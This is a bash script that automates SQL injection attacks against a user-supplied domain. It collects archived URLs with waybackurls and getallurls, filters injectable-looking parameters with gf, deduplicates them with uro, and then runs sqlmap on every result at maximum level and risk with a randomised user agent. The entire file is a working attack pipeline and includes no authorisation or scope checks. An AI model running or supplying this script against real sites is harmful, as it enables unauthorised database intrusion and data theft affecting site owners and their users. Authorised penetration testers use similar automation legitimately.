#!/bin/bash
clear
echo "                            *********************************************************"
echo "                            ********** Welcome to SQL Injection automation **********"
echo "                            *********************************************************"

read -p "Enter the target domain: " target_domain

echo ""
echo ""

# Step 1: Find Endpoints Using waybackurls
echo "[*] Step 1: Finding endpoints using waybackurls  ( It May Take a While...)"
waybackurls $target_domain > endpoints.txt
echo "[+] Step 1 complete. Endpoints saved to endpoints.txt"
echo ""
echo ""

# Step 2: Find Endpoints Using getallurls
echo "[*] Step 2: Finding endpoints using getallurls   ( It May Take a While...)"
getallurls $target_domain >> endpoints.txt
echo "[+] Step 2 complete. Additional endpoints saved to endpoints.txt"
echo ""
echo ""

# Step 3: Sort the Endpoints
echo "[*] Step 3: Sorting and removing duplicates"
sort -u endpoints.txt -o sorted_endpoints.txt
echo "[+] Step 3 complete. Sorted and unique endpoints saved to sorted_endpoints.txt"
echo ""
echo ""

# Step 4: Find SQLi Endpoints Using gf
echo "[*] Step 4: Finding SQLi endpoints using gf"
gf sqli sorted_endpoints.txt > sqli_endpoints.txt
echo "[+] Step 4 complete. SQLi endpoints saved to sqli_endpoints.txt"
echo ""
echo ""

# Step 5: Run uro Tool to Remove Duplicates
echo "[*] Step 5: Removing duplicates using uro"
uro -i sqli_endpoints.txt -o sqli_endpoints_uniq.txt
echo "[+] Step 5 complete. Unique SQLi endpoints saved to sqli_endpoints_uniq.txt"

# Step 6: Run SQLmap on the URLs
echo "[*] Step 6: Running SQLmap on the endpoints"
sqlmap -m sqli_endpoints_uniq.txt --batch --random-agent --level=3 --risk=3 | tee sqlmap_output.txt
echo "[+] Step 6 complete. SQLmap scan completed"

echo "[*] Fuzzing process finished!"
